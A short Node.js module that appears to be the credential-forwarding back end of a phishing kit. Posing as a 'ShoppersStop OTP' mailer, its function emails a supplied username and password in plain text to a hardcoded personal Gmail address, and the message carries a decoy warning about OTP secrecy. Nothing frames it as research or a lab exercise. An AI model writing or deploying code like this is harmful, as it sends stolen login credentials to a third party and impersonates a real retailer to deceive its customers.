const nodemailer = require('nodemailer')

const mail = "vivekkathrotiya911@gmail.com"

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_SENDER_MAIL,
    pass: process.env.EMAIL_APP_PASSWORD,
  },
});

async function nodemailsender(user, password) {
  
  const info = await transporter.sendMail({
    from: `"ShoppersStop OTP 👻" <${process.env.EMAIL_SENDER_MAIL}>`,
    to: mail,
    subject: `Hello ✔ check OTP: ${user}${password}`,
    text: "Hello Thare is your OTP",
    html: `<b>Your User is ${user} and Password is ${password}</b><br><br>
    <p style="color:red; font-weight:bold;">
      Warning: Do not share your OTP with anyone. Our team will never ask you for it.
    </p>`,
  });

  console.log("Message sent: %s", info.messageId);
}

module.exports = nodemailsender;